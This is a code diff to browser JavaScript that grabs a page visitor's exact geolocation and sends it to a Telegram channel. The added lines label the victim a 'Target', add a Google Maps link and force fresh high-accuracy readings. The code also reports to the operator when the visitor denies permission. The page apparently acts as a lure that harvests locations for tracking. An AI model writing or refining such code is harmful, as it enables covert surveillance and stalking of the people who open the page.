@@ -66,16 +66,21 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        let geoMsg = `📍 *FF Target Location*\n` +
-                                     `Lat: ${position.coords.latitude}\n` +
-                                     `Lon: ${position.coords.longitude}\n` +
-                                     `Accuracy: ${position.coords.accuracy}m`;
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        let geoMsg = `📍 *Target Location Locked*\n` +
+                                     `Lat/Lon: \`${lat}, ${lon}\`\n` +
+                                     `Accuracy: ${acc}m\n` +
+                                     `🗺️ [Open in Google Maps](${mapsUrl})`;
                         sendToTelegram(geoMsg);
                     },
                     (error) => {
-                        sendToTelegram(`⚠️ Geolocation denied: ${error.message}`);
+                        sendToTelegram(`⚠️ Geolocation denied or unavailable: ${error.message}`);
                     },
-                    { enableHighAccuracy: true }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
         };
